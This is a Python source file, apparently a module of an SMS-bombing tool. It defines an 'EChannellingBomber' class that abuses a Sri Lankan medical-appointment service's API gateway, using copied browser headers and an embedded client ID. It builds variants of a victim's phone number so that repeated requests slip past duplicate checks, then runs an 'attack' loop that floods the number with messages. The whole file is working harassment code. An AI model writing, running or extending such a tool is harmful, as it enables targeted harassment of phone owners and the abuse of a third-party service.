import urllib.parse
import requests
from typing import List, Tuple
from rich.progress import Progress
from core.base import BaseBomber

class EChannellingBomber(BaseBomber):
    def __init__(self, phone_number: str):
        super().__init__(phone_number)
        self.service_name = "eChannelling"
        self.color = "cyan"
        self.base_url = "https://echannelling-apigw.mobitel.lk"
        self.endpoint = "/echannelling/ext/echannelling/ech-api/ech/member-availability"
        self.session.headers.update({
            "Host": "echannelling-apigw.mobitel.lk",
            "Origin": "https://www.echannelling.com",
            "Referer": "https://www.echannelling.com/",
            "x-ibm-client-id": "fbd72ca4-9f75-4cf7-8c1b-4c4b291dfc75",
        })

    def generate_variations(self) -> List[str]:
        n = self.clean_number
        variations = [
            n,                      # 712345678
            f"0{n}",                 # 0712345678
            f"94{n}",                # 94712345678
            f"+94{n}",               # +94712345678
            f"0094{n}",              # 0094712345678
            f" {n}",                 # space + number
            f"+94 {n}",              # +94 712345678
            f"94 {n}",               # 94 712345678
            f"0 {n}",                # 0 712345678
            f"{n} ",                 # number + space
        ]
        seen = set()
        return [v for v in variations if not (v in seen or seen.add(v))]

    def send_one(self, variation: str = None) -> bool:
        # If no variation provided, pick a random one
        if variation is None:
            import random
            variation = random.choice(self.generate_variations())

        encoded_var = urllib.parse.quote(variation)
        url = f"{self.base_url}{self.endpoint}/{encoded_var}"
        
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get('send-indicater', '0') != '0'
            return False
        except Exception:
            return False

    def attack(self, num_msgs: int, delay: float, progress: Progress, task_id) -> Tuple[int, int]:
        """Custom attack loop for eChannelling because it uses variations"""
        variations = self.generate_variations()
        sent = 0
        failed = 0
        
        progress.update(task_id, description=f"[{self.color}]{self.service_name}: Starting...")
        
        while sent < num_msgs and self.check_running():
            for variation in variations:
                if sent >= num_msgs or not self.check_running():
                    break
                
                if self.send_one(variation):
                    sent += 1
                    self.sent_count += 1
                    progress.update(
                        task_id, 
                        advance=1,
                        description=f"[{self.color}]{self.service_name}: [green]✓ Sent {sent}/{num_msgs}"
                    )
                else:
                    failed += 1
                    self.failed_count += 1
                    progress.update(
                        task_id,
                        description=f"[{self.color}]{self.service_name}: [yellow]✗ Failed ({failed})"
                    )
                
                if sent < num_msgs and self.check_running():
                    import time
                    for _ in range(int(delay * 10)):
                        if not self.check_running():
                            break
                        time.sleep(0.1)
        
        return sent, failed
